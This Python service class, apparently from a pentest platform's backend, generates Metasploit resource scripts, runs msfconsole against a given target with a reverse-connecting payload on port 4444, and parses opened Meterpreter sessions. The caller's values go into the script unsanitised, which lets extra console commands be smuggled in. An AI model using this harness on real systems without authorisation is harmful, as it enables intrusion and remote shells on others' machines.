# backend/app/services/metasploit_service.py
import subprocess
import os
import json
from datetime import datetime
from app.utils.task_manager import update_task_status

class MetasploitService:
    def __init__(self):
        self.reports_path = "/app/reports"
    
    def run_exploit_async(self, exploit, target, payload, lhost, task_id):
        """Exécution d'exploit Metasploit asynchrone"""
        try:
            update_task_status(task_id, "running")
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            script_file = f"{self.reports_path}/msf_script_{timestamp}.rc"
            output_file = f"{self.reports_path}/msf_output_{timestamp}.txt"
            
            # Génération du script Metasploit
            msf_script = f"""use {exploit}
set RHOSTS {target}
set PAYLOAD {payload}
set LHOST {lhost}
set LPORT 4444
set ExitOnSession false
exploit -j
sessions -l
exit
"""
            
            with open(script_file, 'w') as f:
                f.write(msf_script)
            
            # Exécution via msfconsole
            cmd = ["msfconsole", "-q", "-r", script_file, "-o", output_file]
            
            result = subprocess.run(
                cmd,
                capture_output=True,
                text=True,
                timeout=300
            )
            
            # Analyse des résultats
            analysis = self._analyze_msf_output(output_file, result.stdout)
            
            update_task_status(task_id, "completed", {
                "exploit": exploit,
                "target": target,
                "payload": payload,
                "sessions": analysis["sessions"],
                "success": analysis["success"],
                "output_file": os.path.basename(output_file)
            })
            
        except Exception as e:
            update_task_status(task_id, "failed", {"error": str(e)})
    
    def _analyze_msf_output(self, output_file, stdout):
        """Analyse de la sortie Metasploit"""
        analysis = {
            "success": False,
            "sessions": [],
            "errors": []
        }
        
        try:
            content = ""
            if os.path.exists(output_file):
                with open(output_file, 'r') as f:
                    content = f.read()
            else:
                content = stdout
            
            # Recherche de sessions actives
            for line in content.split('\n'):
                if 'Meterpreter session' in line and 'opened' in line:
                    analysis["success"] = True
                    session_info = self._extract_session_info(line)
                    analysis["sessions"].append(session_info)
                elif 'error' in line.lower() or 'failed' in line.lower():
                    analysis["errors"].append(line.strip())
            
            return analysis
            
        except Exception as e:
            return {"error": str(e)}
    
    def _extract_session_info(self, line):
        """Extraction des informations de session"""
        # Example: [*] Meterpreter session 1 opened (192.168.1.100:4444 -> 192.168.1.200:49152)
        parts = line.split()
        session_id = None
        connection = ""
        
        for i, part in enumerate(parts):
            if part == "session" and i + 1 < len(parts):
                session_id = parts[i + 1]
            elif "->" in part:
                connection = f"{parts[i-1]} -> {part}"
        
        return {
            "session_id": session_id,
            "connection": connection,
            "timestamp": datetime.now().isoformat()
        }
